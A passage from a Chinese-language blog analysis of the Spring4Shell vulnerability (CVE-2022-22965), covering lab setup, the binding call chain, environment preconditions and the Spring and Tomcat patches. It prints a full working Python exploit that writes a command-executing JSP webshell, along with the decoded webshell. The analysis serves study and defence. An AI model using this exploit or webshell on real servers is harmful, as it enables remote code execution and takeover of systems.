</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> SpringApplicationBuilder <span class="title">configure</span><span class="params">(SpringApplicationBuilder builder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> builder.sources(ApplicationMain.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ApplicationMain.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、测试步骤"><a href="#三、测试步骤" class="headerlink" title="三、测试步骤"></a>三、测试步骤</h3><ol><li>使用命令：<code>mvn clean package</code>打包为**.WAR**文件；</li><li>放在<strong>tomcat</strong>的<strong>webapps</strong>目录下，tomcat中<strong>bin</strong>目录下<strong>start</strong>开启tomcat；</li><li>访问<a href="http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser%EF%BC%8C%E6%98%BE%E7%A4%BAok%EF%BC%8C%E8%AF%B4%E6%98%8E%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F%E3%80%82">http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser，显示ok，说明部署成功。</a></li><li>执行poc脚本（poc见下一部分），按照poc显示的位置进行命令执行：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py --url http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220409155701904.png" alt="image-20220409155701904"></p><h2 id="0x04-POC拆解："><a href="#0x04-POC拆解：" class="headerlink" title="0x04 POC拆解："></a>0x04 POC拆解：</h2><h3 id="一、poc源码："><a href="#一、poc源码：" class="headerlink" title="一、poc源码："></a>一、poc源码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin,urlparse</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params">Thread</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(self.__class__, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(self.url,</span><br><span class="line">                          headers=headers,</span><br><span class="line">                          data=data,</span><br><span class="line">                          timeout=<span class="number">15</span>,</span><br><span class="line">                          allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                          verify=<span class="literal">False</span>)</span><br><span class="line">            time.sleep(<span class="number">10</span>) <span class="comment">## Wait for the upload to complete</span></span><br><span class="line">            shellurl = urljoin(self.url, <span class="string">&#x27;tomcatwar.jsp&#x27;</span>)</span><br><span class="line">            shellgo = requests.get(shellurl,</span><br><span class="line">                                   timeout=<span class="number">15</span>,</span><br><span class="line">                                   allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                                   stream=<span class="literal">True</span>,</span><br><span class="line">                                   verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> shellgo.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Vulnerable，shell url: <span class="subst">&#123;shellurl&#125;</span>?pwd=j&amp;cmd=whoami&quot;</span>)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                parsedurl = urlparse(shellurl)</span><br><span class="line">                rooturl = parsedurl.scheme+<span class="string">&quot;://&quot;</span>+parsedurl.netloc </span><br><span class="line">                shellurlroot = urljoin(rooturl, <span class="string">&#x27;tomcatwar.jsp&#x27;</span>)</span><br><span class="line">                shellgoroot = requests.get(shellurlroot,</span><br><span class="line">                                   timeout=<span class="number">15</span>,</span><br><span class="line">                                   allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                                   stream=<span class="literal">True</span>,</span><br><span class="line">                                   verify=<span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">if</span> shellgoroot.status_code == <span class="number">200</span>: </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Vulnerable，shell url: <span class="subst">&#123;shellurlroot&#125;</span>?pwd=j&amp;cmd=whoami&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\033[91m[&quot;</span> + <span class="string">&#x27;\u2718&#x27;</span> + <span class="string">&quot;]\033[0m&quot;</span>, self.url,</span><br><span class="line">                        <span class="string">&quot;\033[91mNot Vulnerable! :(\033[0m &quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Spring-Core Rce.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;url file&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        <span class="comment">#将exploit作为一个线程</span></span><br><span class="line">        Exploit(args.url).start()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.file) <span class="keyword">as</span> f:</span><br><span class="line">            urls = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line">            [Exploit(url).start() <span class="keyword">for</span> url <span class="keyword">in</span> urls]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br></pre></td></tr></table></figure><h3 id="二、data段内容分析"><a href="#二、data段内容分析" class="headerlink" title="二、data段内容分析"></a>二、data段内容分析</h3><h4 id="1-调用链分析"><a href="#1-调用链分析" class="headerlink" title="1.调用链分析"></a>1.调用链分析</h4><p>​        显而易见，这个poc的核心就在于发送数据包中的内容，也就是data段的内容，我们将其进行url解码，看看他做了怎样的参数传递：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里添加了缩进,没有按照原来的空格格式，方便理解</span></span><br><span class="line"><span class="comment">//参数1</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;<span class="function">i </span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)</span>))</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">java.io.InputStreamin = </span><br><span class="line">        %&#123;c1&#125;i.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); </span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>; </span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>]; </span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125; </span><br><span class="line">&#125; </span><br><span class="line">%&#123;suffix&#125;i</span><br><span class="line"></span><br><span class="line">&amp;<span class="comment">//参数2</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</span><br><span class="line">&amp;<span class="comment">//参数3</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT</span><br><span class="line">&amp;<span class="comment">//参数4</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar</span><br><span class="line">&amp;<span class="comment">//参数5</span></span><br><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br></pre></td></tr></table></figure><p>​        可以看到，每个参数就是由class.module.classLoader.resources.context.parent.pipeline.first.xxx这样的调用链进行赋值的，我们虽然能看到这样的调用关系，但我们依然不知道最后的调用链怎么样的，也就是说，我们能看到有一个属性叫pattern，但我们只知道他的名字，不知道他究竟是谁。</p><p>​        因此，我们选择背景知识第一部分提到的SpringMVC实现参数绑定的方法：<code>WebDataBinder.doBind(MutablePropertyValues)</code>方法设置断点！</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220409174941438.png" alt="image-20220409174941438"></p><p>​        从此处开始，就开始进行参数的绑定工作，那么，spring的递归绑定，也就是上文中提到的可嵌套绑定又是如何实现的呢？查询发现，是通过<code>AbstractNestablePropertyAccessor</code> 类，提供对嵌套属性的支持，对于这个类的讲解，具体可以参看：<a href="https://www.bbsmax.com/A/WpdKV4ZA5V/%E3%80%82">https://www.bbsmax.com/A/WpdKV4ZA5V/。</a></p><blockquote><p>​    getPropertyAccessorForPropertyPath 根据属性(propertyPath)获取所在 bean 的包装对象 beanWrapper。如果是类似 director.info.name 的嵌套属性，则需要递归获取。真正获取指定属性的包装对象则由方法 getNestedPropertyAccessor 完成。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用自https://www.bbsmax.com/A/WpdKV4ZA5V/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> AbstractNestablePropertyAccessor <span class="title">getPropertyAccessorForPropertyPath</span><span class="params">(String propertyPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取第一个点之前的属性部分。eg: director.info.name 返回 department</span></span><br><span class="line">    <span class="keyword">int</span> pos = PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath);</span><br><span class="line">    <span class="comment">// 2. 递归处理嵌套属性</span></span><br><span class="line">    <span class="comment">// 2.1 先获取 director 属性所在类的 rootBeanWrapper</span></span><br><span class="line">    <span class="comment">// 2.2 再获取 info 属性所在类的 directorBeanWrapper</span></span><br><span class="line">    <span class="comment">// 2.3 依此类推，获取最后一个属性 name 属性所在类的 infoBeanWrapper</span></span><br><span class="line">    <span class="keyword">if</span> (pos &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        String nestedProperty = propertyPath.substring(<span class="number">0</span>, pos);</span><br><span class="line">        String nestedPath = propertyPath.substring(pos + <span class="number">1</span>);</span><br><span class="line">        AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);<span class="comment">//断！</span></span><br><span class="line">        <span class="keyword">return</span> nestedPa.getPropertyAccessorForPropertyPath(nestedPath);</span><br><span class="line">    <span class="comment">// 3. 当前对象直接返回</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        这里提到getPropertyAccessorForPropertyPath方法用于递归获取beanWrapper，然后交给getNestedPropertyAccessor 进行包装。也就是说，我们只需要在这个负责包装的函数处设置断点，步入后进行调试，一直执行到BeanWrapperImpl类中，<code>BeanPropertyHandler.getValue()</code>中就可以查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。<br>​        实际上，前8轮的递归结果都无关紧要，我们想知道的是最后一轮的情况，但是为了看的更清楚，我们附上完整的调用链条：）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">User.getClass()</span><br><span class="line">    java.lang.Class.getModule()</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</span><br><span class="line">                org.apache.catalina.webresources.StandardRoot.getContext()</span><br><span class="line">                    org.apache.catalina.core.StandardContext.getParent()</span><br><span class="line">                        org.apache.catalina.core.StandardHost.getPipeline()</span><br><span class="line">                            org.apache.catalina.core.StandardPipeline.getFirst()</span><br><span class="line"></span><br><span class="line">                                org.apache.catalina.valves.AccessLogValve.setPattern()</span><br></pre></td></tr></table></figure><p>​        这样我们就看到，最后一层调用<code>pattern</code>参数最终对应的就是<code>AccessLogValve.setPattern()</code>方法，也就是我们在tomcat前置知识中提到写入日志的部分，我们最终利用参数绑定更改了tomcat的日志写入的内容，最终导致了webshell的写入。</p><h4 id="2-参数刨析（大部分引用）"><a href="#2-参数刨析（大部分引用）" class="headerlink" title="2.参数刨析（大部分引用）"></a>2.参数刨析（大部分引用）</h4><h5 id="pattern参数："><a href="#pattern参数：" class="headerlink" title="pattern参数："></a>pattern参数：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class.<span class="keyword">module</span>.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;<span class="function">i </span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)</span>))</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">java.io.InputStreamin = </span><br><span class="line">        %&#123;c1&#125;i.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream(); </span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>; </span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>]; </span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125; </span><br><span class="line">&#125; </span><br><span class="line">%&#123;suffix&#125;i</span><br></pre></td></tr></table></figure><p>​    很明显，这是一个webshell，这里使用了形如<code>%&#123;xxxx&#125;i</code>的东西实际是AccessLog的一个特性，为了便于写入日志，用这样的结构来引用请求和响应header中的内容，这就解释了刚刚poc中header部分的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">            <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>进行替换后的jsp脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;j&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line"> <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                   out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>​        那我们为什么要采取这种方法呢？脚本作者是这样解释的：</p><blockquote><p># This may seem strange, but this seems to be needed to bypass some check that looks for “Runtime” in the log_pattern</p></blockquote><p>大概是一种安全措施吧。</p><h5 id="suffix参数"><a href="#suffix参数" class="headerlink" title="suffix参数:"></a>suffix参数:</h5><ul><li>参数值：<code>.jsp</code></li></ul><p>​        该参数为文件后缀。</p><h5 id="directory参数"><a href="#directory参数" class="headerlink" title="directory参数:"></a>directory参数:</h5><ul><li>参数值：<code>webapps/ROOT</code></li></ul><p>​        该参数为access_log的文件的输出目录，ROOT为Tomcat Web应用根目录。部署到目录下的Web应用，可以直接通过<code>http://localhost:8080/文件名</code>访问（仅仅是为了方便，其他目录也可以）。</p><h5 id="prefix参数"><a href="#prefix参数" class="headerlink" title="prefix参数:"></a>prefix参数:</h5><ul><li>参数值：<code>tomcatwar</code></li></ul><p>​        即access_log的文件名。</p><h5 id="fileDateFormat参数"><a href="#fileDateFormat参数" class="headerlink" title="fileDateFormat参数"></a>fileDateFormat参数</h5><ul><li>参数值：空</li></ul><p>​        access_log的文件名不包含日期。</p><p>为什么要单独设置这个函数呢？</p><blockquote><p>#Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times<br>#If re-running the exploit, this will create an artifact of {old_file_name}_.jsp</p></blockquote><p>大概意思是说，这样为空的设置可以让脚本重复运行，但是亲测无效：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220409200831710.png" alt="image-20220409200831710"></p><p>​    只是简单的在一个文件里写了两遍。</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>​        通过请求传入的参数，利用SpringMVC参数绑定机制，控制了Tomcat <code>AccessLogValve</code>的属性，让Tomcat在<code>webapps/ROOT</code>目录输出定制的“访问日志”<code>tomcatwar.jsp</code>，该“访问日志”实际上为一个JSP webshell。</p><h2 id="0x05-环境分析"><a href="#0x05-环境分析" class="headerlink" title="0x05 环境分析"></a>0x05 环境分析</h2><p>​        漏洞是一个spring+tomcat的漏洞，看似危害比较大，但是我认为还是有较为苛刻的环境限制的：</p><h3 id="一、Tomat-War的限制"><a href="#一、Tomat-War的限制" class="headerlink" title="一、Tomat+War的限制"></a>一、Tomat+War的限制</h3><p>​        上文中存在一个调用<strong>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()<strong>，只有通过这个调用关系，才能顺利实现我们预判的调用链条，二这里出现的</strong>ParallelWebappClassLoader</strong>类是只有在Web应用以war包部署到Tomcat中时才会使用到的。<br>​        如果我们更换为其他的，如jar包的部署方式，在第三次递归中，<code>classLoader</code>嵌套参数被解析为<code>org.springframework.boot.loader.LaunchedURLClassLoader</code>，查看<a href="https://github.com/spring-projects/spring-boot/blob/main/spring-boot-project/spring-boot-tools/spring-boot-loader/src/main/java/org/springframework/boot/loader/LaunchedURLClassLoader.java">其源码</a>，没有<code>getResources()</code>方法，也就正常的进行我们预判的调用链。<br>​        但是，这只是限制了本poc的运行环境，并不是说这个漏洞就不存在了，这个漏洞依然存在，只是需要研究出一个合理的，从Web应用到Web服务中间件的<code>class.module.classLoader....</code>的调用链，理论上如Jetty、Weblogic、Glassfish等其他web应用也是可被利用的。而且这里给出的利用方法是写入日志，还有可能写入配置文件，当然，使用更先进的技术如<a href="https://view.inews.qq.com/a/20211107A03H4C00">内存马</a>，也是有可能的！</p><p>​    因此，并不是说使用其他web应用我们就不需要防范了。</p><h3 id="二、JDK版本的限制（引用）"><a href="#二、JDK版本的限制（引用）" class="headerlink" title="二、JDK版本的限制（引用）"></a>二、JDK版本的限制（引用）</h3><p>​        在前面章节中<code>AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);</code>调用的过程中，实际上Spring做了一道防御。</p><p>​        Spring使用<code>org.springframework.beans.CachedIntrospectionResults</code>缓存并返回Java Bean中可以被<code>BeanWrapperImpl</code>使用的<code>PropertyDescriptor</code>。在<code>CachedIntrospectionResults</code>第289行构造方法中：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image031-1-1024x202.png" alt="img"></p><p>​        该行的意思是：当Bean的类型为<code>java.lang.Class</code>时，不返回<code>classLoader</code>和<code>protectionDomain</code>的<code>PropertyDescriptor</code>。Spring在构建嵌套参数的调用链时，会根据<code>CachedIntrospectionResults</code>缓存的<code>PropertyDescriptor</code>进行构建：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image033-1-1024x397.png" alt="img"></p><p>​        不返回，也就意味着<code>class.classLoader...</code>这种嵌套参数走不通，即形如下方的调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getClassLoader()</span><br><span class="line">        BarClassLoader.getBaz()</span><br><span class="line">            ......</span><br></pre></td></tr></table></figure><p>​        这在JDK&lt;=1.8都是有效的。但是在JDK 1.9之后，Java为了支持模块化，在<code>java.lang.Class</code>中增加了<code>module</code>属性和对应的<code>getModule()</code>方法，自然就能通过如下调用链绕过判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Foo.getClass()</span><br><span class="line">    java.lang.Class.getModule() // 绕过</span><br><span class="line">        java.lang.Module.getClassLoader()</span><br><span class="line">            BarClassLoader.getBaz()</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure><p>​        这就是为什么本漏洞利用条件之二，JDK&gt;=1.9。</p><h3 id="三、补丁分析-引用"><a href="#三、补丁分析-引用" class="headerlink" title="三、补丁分析(引用)"></a>三、补丁分析(引用)</h3><h4 id="1-Spring-5-3-18补丁"><a href="#1-Spring-5-3-18补丁" class="headerlink" title="1.Spring 5.3.18补丁"></a>1.Spring 5.3.18补丁</h4><p>通过对比Spring 5.3.17和5.3.18的版本，可以看到在3月31日有一项名为“Redefine PropertyDescriptor filter的”提交。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image035-1-1024x290.png" alt="img"></p><p>进入该提交，可以看到对<code>CachedIntrospectionResults</code>构造函数中Java Bean的<code>PropertyDescriptor</code>的过滤条件被修改了：当Java Bean的类型为<code>java.lang.Class</code>时，仅允许获取<code>name</code>以及<code>Name</code>后缀的属性描述符。在章节<code>3.2.2 ``关键点二：JDK版本</code>中，利用<code>java.lang.Class.getModule()</code>的链路就走不通了。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image037-1024x292.png" alt="img"></p><h4 id="2-Tomcat-9-0-62补丁"><a href="#2-Tomcat-9-0-62补丁" class="headerlink" title="2. Tomcat 9.0.62补丁"></a>2. Tomcat 9.0.62补丁</h4><p>通过对比Tomcat 9.0.61和9.0.62的版本，可以看到在4月1日有一项名为“Security hardening. Deprecate getResources() and always return null.”提交。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image039-1024x424.png" alt="img"></p><p>进入该提交，可以看到对<code>getResources()</code>方法的返回值做了修改，直接返回<code>null</code>。<code>WebappClassLoaderBase</code>即<code>ParallelWebappClassLoader</code>的父类，在章节<code>3.2.1 ``关键点一：Web应用部署方式</code>中，利用<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>的链路就走不通了。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image041-1024x393.png" 